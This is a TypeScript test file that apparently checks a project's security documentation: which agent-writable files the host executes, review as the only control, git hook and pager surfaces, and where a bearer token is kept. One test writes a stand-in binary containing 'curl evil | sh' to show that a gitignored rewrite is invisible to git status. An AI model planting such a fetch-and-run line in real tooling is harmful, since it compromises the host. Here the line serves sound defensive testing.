// There is no boundary left to test, only the consequence: an agent working here can write the
// files the host then executes, and review is the only control. These fail if that stops being said.

import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { readdir, readFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";
import { describe, test } from "node:test";
import { fileURLToPath } from "node:url";

const repoRoot = new URL("..", import.meta.url);
const repoRootPath = fileURLToPath(repoRoot);

const readDoc = async (name: string): Promise<string> =>
  await readFile(new URL(name, repoRoot), "utf8");

// Globs, because every host tool here discovers its own config and naming the one filename we happen
// to have leaves the rest unreviewed. `.claude/` needs no build step: a session is the trigger.
const hostExecutedFiles = [
  "package.json",
  "scripts/",
  "pnpm-lock.yaml",
  "eslint.config.*",
  ".prettierrc*",
  ".mise*.toml",
  "mise-tasks/",
  "src/**/*.test.ts",
  // A test file's imports run too, at module scope, and a fixture matches no test glob. Naming the
  // directory keeps this true for every future fixture rather than the one that exists.
  "src/fixtures/",
  ".claude/",
  ".github/workflows/",
  ".git/config",
  ".git/hooks/",
  // Not host-EXECUTED, and listed because the consequence has the same shape: Vite copies this into
  // the unauthenticated publish root, DEREFERENCING symlinks, which `static.ts` cannot then see.
  "src/client/public/",
];

void describe("the host-execution consequence is documented where the claim is made", () => {
  void test("SECURITY.md says the host executes agent-writable files from this repo", async () => {
    const security = await readDoc("SECURITY.md");
    for (const file of hostExecutedFiles) {
      assert.ok(security.includes(file), `SECURITY.md does not name ${file} as agent-writable`);
    }
    assert.match(security, /agent-writable/);
  });

  void test("SECURITY.md says the review is now the only control, not the second of two", async () => {
    // The container was the first of two, and its removal is why the review matters more than it
    // did - a reader who misses that sentence treats the checklist as belt-and-braces.
    const security = await readDoc("SECURITY.md");
    const toolchain = security.slice(security.indexOf("## Toolchain"));
    assert.ok(toolchain.length > 0, "SECURITY.md has no Toolchain section");
    assert.match(toolchain, /only control rather than the second of two/);
    assert.match(toolchain, /git status/);
    assert.match(toolchain, /git diff/);
  });

  void test("the host-run exception names everything the host would execute", async () => {
    // The exception paragraph is where a human decides to run something on the Mac, so the list
    // that matters is the one there, not the one anywhere in the file.
    const security = await readDoc("SECURITY.md");
    const toolchain = security.slice(security.indexOf("## Toolchain"));
    for (const file of hostExecutedFiles) {
      assert.ok(
        toolchain.includes(file),
        `SECURITY.md's toolchain exception does not name ${file} as agent-writable`,
      );
    }
  });

  void test("plan 005 states it in what containment actually buys", async () => {
    const plan = await readDoc("plans/005-containment.md");
    const start = plan.indexOf("## What containment actually buys");
    assert.ok(start >= 0, "plan 005 has no `What containment actually buys` section");
    const section = plan.slice(start, plan.indexOf("\n## ", start + 1));
    for (const file of hostExecutedFiles) {
      assert.ok(section.includes(file), `plan 005 does not name ${file} as agent-writable`);
    }
  });

  // The enumeration above is hand-written, so it goes stale the moment a test imports a helper the
  // glob does not match. This derives the set from the tree rather than trusting the list.
  void test("every test-only module the test run executes is covered by the enumeration", async () => {
    const entries = await readdir(new URL("./", repoRoot), {
      recursive: true,
      withFileTypes: true,
    });
    const srcFiles = entries
      .filter((entry) => entry.isFile() && entry.name.endsWith(".ts"))
      .map((entry) => `${relative(repoRootPath, join(entry.parentPath, entry.name))}`);

    // `src/*.ts` is the production layer, reviewed as code either way; what this is after is the
    // test-only helpers below it. A `.ts`-only graph would call the client's modules test-only.
    const nonTestSources = await Promise.all(
      entries
        .filter((entry) => entry.isFile())
        .map((entry) => relative(repoRootPath, join(entry.parentPath, entry.name)))
        .filter((file) => !file.endsWith(".test.ts") && /\.(ts|vue|mjs|js|json)$/.test(file))
        .map(async (file) => [file, await readFile(join(repoRootPath, file), "utf8")] as const),
    );
    const isProductionModule = (file: string): boolean =>
      dirname(file) === "src" ||
      nonTestSources.some(
        ([other, source]) => other !== file && source.includes(`/${file.split("/").pop() ?? ""}"`),
      );

    const importedByTests = new Set<string>();
    for (const file of srcFiles.filter((candidate) => candidate.endsWith(".test.ts"))) {
      const source = await readFile(join(repoRootPath, file), "utf8");
      for (const match of source.matchAll(/from\s+"(\.[^"]+)"/g)) {
        const target = relative(repoRootPath, join(repoRootPath, dirname(file), match[1] ?? ""));
        if (srcFiles.includes(target) && !target.endsWith(".test.ts")) importedByTests.add(target);
      }
    }

    for (const target of importedByTests) {
      if (isProductionModule(target)) continue;
      const covered = hostExecutedFiles.some(
        (entry) => entry === target || (entry.endsWith("/") && target.startsWith(entry)),
      );
      assert.ok(
        covered,
        `${target} is executed by \`pnpm test\` but no entry of the review list names it`,
      );
    }
  });
});

// `git status --ignored` collapses a directory to one line, so a rewritten binary inside it is
// byte-identical output. The assertion is the inverse now: replace the tree, do not inspect it.
void describe("the host-executed trees git cannot see are covered by a command that can", () => {
  for (const path of ["node_modules", ".pnpm-store"]) {
    void test(`${path} is gitignored, which is why the ordinary review misses it`, async () => {
      const ignored = await readDoc(".gitignore");
      assert.match(ignored, new RegExp(`^${path.replace(".", "\\.")}$`, "m"));
    });
  }

  void test("SECURITY.md's checklist replaces the trees rather than inspecting them", async () => {
    const security = await readDoc("SECURITY.md");
    assert.ok(
      security.includes("rm -rf node_modules .pnpm-store && pnpm install --frozen-lockfile"),
      "SECURITY.md does not name a control that reaches inside the two gitignored executed trees",
    );
  });

  void test("and does not prescribe the check that reports the directory and not its contents", async () => {
    // Demonstrated rather than asserted from memory: this runs `git status --ignored` against a
    // scratch repository and shows the output is unchanged by a rewrite inside it.
    const dir = mkdtempSync(join(tmpdir(), "agentdeck-ignored-"));
    try {
      const git = (...args: string[]): string =>
        execFileSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
          cwd: dir,
          encoding: "utf8",
        });
      git("init", "-q");
      writeFileSync(join(dir, ".gitignore"), "node_modules\n");
      mkdirSync(join(dir, "node_modules", ".bin"), { recursive: true });
      writeFileSync(join(dir, "node_modules", ".bin", "eslint"), "#!/bin/sh\nexec eslint\n");
      const before = git("status", "--ignored", "--porcelain", "--", "node_modules");
      writeFileSync(join(dir, "node_modules", ".bin", "eslint"), "#!/bin/sh\ncurl evil | sh\n");
      const after = git("status", "--ignored", "--porcelain", "--", "node_modules");
      assert.equal(after, before, "git status --ignored turned out to see inside after all");
      assert.match(before, /node_modules\/\n?$/);

      const security = await readDoc("SECURITY.md");
      assert.ok(
        !security.includes("git status --ignored -- node_modules"),
        "SECURITY.md prescribes a command that cannot see what it is prescribed for",
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  void test("both trees are named as agent-writable where the claim is made", async () => {
    const security = await readDoc("SECURITY.md");
    const plan = await readDoc("plans/005-containment.md");
    for (const doc of [security, plan]) {
      assert.match(doc, /node_modules/);
      assert.match(doc, /\.pnpm-store/);
    }
  });
});

// None of `.git` is tracked, so the review is as blind to it as to node_modules - and `git diff` is
// itself what fires a `[core] pager` entry. What remains is the pair of commands that can see it.
const docs: readonly (readonly [string, string])[] = [
  ["SECURITY.md", "SECURITY.md"],
  ["plan 005", "plans/005-containment.md"],
];

void describe("git's own execution surfaces are covered where review cannot see them", () => {
  for (const [name, path] of docs) {
    void test(`${name} names the two commands that can see .git`, async () => {
      const doc = await readDoc(path);
      assert.ok(
        doc.includes("git config --local --list"),
        `${name} omits git config --local --list`,
      );
      assert.ok(doc.includes("ls -la .git/hooks"), `${name} omits ls -la .git/hooks`);
      assert.match(doc, /\.sample/);
    });
  }

  void test("the iterate skill runs host git with pager and hooks disabled", async () => {
    // The skill is what prescribes the review and then does the branch, merge and switch on the
    // host. Each of those is a hook trigger, and `git diff` is a pager trigger.
    const skill = await readDoc(".claude/skills/iterate/SKILL.md");
    const hardened = /git -c core\.pager=cat -c\s+core\.hooksPath=\/dev\/null/g;
    const uses = skill.match(hardened) ?? [];
    assert.ok(uses.length >= 4, `only ${uses.length} host git commands are hardened`);

    // A count is a floor rather than coverage: every stage ends in a subagent's own host git, which
    // no per-command flag reaches. The shared prompt is the only layer that does.
    assert.match(
      skill,
      /Every git command you run is HOST git/,
      "the shared agent prompt must tell every stage to harden its own git commands",
    );
    for (const bare of [
      /(?<!-c )\bgit switch -c /,
      /(?<!-c )\bgit merge --no-ff /,
      /(?<!-c )\bgit status --porcelain/,
    ]) {
      assert.doesNotMatch(skill, bare, `the skill still runs an unhardened ${String(bare)}`);
    }
  });
});

// The enumerated list is a floor: the host tools discover config we did not name, so a review
// scoped to the list is a review with a hole in it. Both documents have to say so.
void describe("the review list is stated as a floor rather than the whole job", () => {
  for (const [name, path] of docs) {
    void test(`${name} requires reviewing every modified file, not only the listed ones`, async () => {
      const doc = await readDoc(path);
      assert.match(doc, /floor/);
      assert.match(doc, /every added or modified\s+file in the diff/);
    });
  }

  void test("plan 005 says a workflow file declares its own permissions", async () => {
    const plan = await readDoc("plans/005-containment.md");
    const start = plan.indexOf("## What containment actually buys");
    const section = plan.slice(start, plan.indexOf("\n## ", start + 1));
    assert.match(section, /permissions:/);
    assert.match(section, /default workflow permission/);
  });
});

void describe("the user's bearer token is not at the root of a working tree", () => {
  void test(".gitignore does not put it at the repo root", async () => {
    // The repo root is a directory sessions are pointed at, and same-uid means 0600 separates
    // nothing - so placement is the only control, and this asserts the one place it must not be.
    const ignored = await readDoc(".gitignore");
    assert.doesNotMatch(
      ignored,
      /^\.agentdeck-token$/m,
      ".agentdeck-token at the repo root is where an agent's own `ls -la` meets it",
    );
  });

  void test("neither .gitignore nor loadToken claims a container protects the placement", async () => {
    // The two places a reader meets the token's home both used to credit a bind mount that no
    // longer exists. Scoped by NAME rather than a byte count: the file grew past the old slice.
    const server = await readDoc("src/server.ts");
    const ignored = await readDoc(".gitignore");
    for (const [path, text] of [
      [".gitignore", ignored],
      ["src/server.ts", server.slice(0, server.indexOf("export const main"))],
    ] as const) {
      assert.doesNotMatch(text, /bind mount/i, `${path} still credits a bind mount`);
      assert.doesNotMatch(text, /container-local volume/i, `${path} still credits a volume`);
    }
    assert.match(ignored, /AGENTDECK_TOKEN_FILE/);
    assert.match(ignored, /~\/\.agentdeck\/token/, ".gitignore must name where the token now is");
    assert.match(ignored, /inside a tree a session is\s*#?\s*pointed at/);
  });

  void test("the default token home is one a clean Mac already has, and no session is pointed at", async () => {
    // The old default was reasoned from a container volume no ordinary user on a Mac can create, so
    // `pnpm start` failed before the port. The replacement must be writable with nothing set.
    const { defaultTokenFile, tokenInsideAllowlist } = await import("./server.ts");
    assert.equal(defaultTokenFile(), join(homedir(), ".agentdeck", "token"));
    assert.equal(tokenInsideAllowlist(defaultTokenFile(), [repoRootPath]), undefined);
  });

  void test("a token inside an allowlisted tree is caught, at the root and below it", async () => {
    // The rule plan 005 states in prose, as a check. Containment rather than membership: a token
    // one directory down meets the same `grep -rn token .` as one at the root.
    const { tokenInsideAllowlist } = await import("./server.ts");
    const allowed = ["/workspace/web", "/workspace/agentdeck"];
    assert.equal(tokenInsideAllowlist("/workspace/web/token", allowed), "/workspace/web");
    assert.equal(tokenInsideAllowlist("/workspace/web/a/b/token", allowed), "/workspace/web");
    assert.equal(tokenInsideAllowlist("/workspace/web", allowed), "/workspace/web");
    // The neighbour whose name merely starts the same is not inside it, which is the mistake a
    // string prefix without the separator makes.
    assert.equal(tokenInsideAllowlist("/workspace/web-secrets/token", allowed), undefined);
    assert.equal(tokenInsideAllowlist("/var/lib/agentdeck/token", allowed), undefined);
  });

  void test("an unwritable token path is a sentence naming AGENTDECK_TOKEN_FILE", async () => {
    // An unhandled EACCES names no variable and the token then lands wherever happened to be
    // writable - including the one place it must not be.
    const { loadToken } = await import("./server.ts");
    const dir = mkdtempSync(join(tmpdir(), "agentdeck-token-"));
    try {
      chmodSync(dir, 0o500);
      assert.throws(
        () => loadToken(join(dir, "nested", "token")),
        (error: Error) => {
          assert.match(error.message, /AGENTDECK_TOKEN_FILE/);
          assert.match(error.message, /session is pointed at/);
          return true;
        },
      );
    } finally {
      chmodSync(dir, 0o700);
      rmSync(dir, { recursive: true, force: true });
    }
  });

  void test("plan 005 lists the token in the blast radius with the same-uid caveat", async () => {
    const plan = await readDoc("plans/005-containment.md");
    const start = plan.indexOf("## What containment actually buys");
    const section = plan.slice(start, plan.indexOf("\n## ", start + 1));
    assert.match(section, /AGENTDECK_TOKEN_FILE/);
    assert.match(section, /distinct uid/);
  });
});
